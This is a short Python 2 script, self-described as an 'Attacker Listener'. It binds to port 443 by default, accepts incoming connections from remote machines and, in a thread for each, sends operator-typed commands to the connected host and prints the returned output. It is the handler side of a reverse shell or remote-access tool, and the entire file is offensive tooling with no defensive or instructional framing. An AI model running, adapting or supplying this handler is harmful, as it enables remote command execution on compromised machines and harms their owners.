#!/usr/bin/env python
from Tkinter import *
import sys
import socket 
import threading
import argparse
clients={}
import select,sys,time,termios
#import pyautogui
def client_serve(client):
	try:
		print "Enter a command to execute"

		input=sys.stdin.read()
		#pyautogui.hotkeys('ctrl', 'D')
		client.send(input)
		while True:
			print "waiting"
			received_data=client.recv(1024)
			print received_data
			print "success"

			#wait for more connections 
			termios.tcflush(sys.stdin,termios.TCIFLUSH);
			sys.stdin.flush()
			sys.stdout.flush()
			input=raw_input("")
			input+="\n"
			client.sendall(input)

			

	except Exception, e:
		print e
		pass
		
def server_listen(port_number):
	if port_number=='':
		port_number=443
	target_host=socket.gethostbyaddr('localhost')[2][0]
	listener=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	listener.bind(('', port_number))
	listener.listen(25)
	print "Server is listening on port "+ str(port_number)+"..."
	while True:
		client,addr=listener.accept()
		print "Incomming connection from %s:%d" %(addr[0], addr[1])
		
		print addr
		clients [addr[0]]=client

		client_serve_thread=threading.Thread(target=client_serve, args=(client, ))
		client_serve_thread.start()
		

def main():
	parser=argparse.ArgumentParser('Attacker Listener')
	parser.add_argument('-p', '--port', type=int, help='The port number to listen on', default=443)
	args=parser.parse_args()
	port_number=args.port
	server_listen(port_number)
	
main();


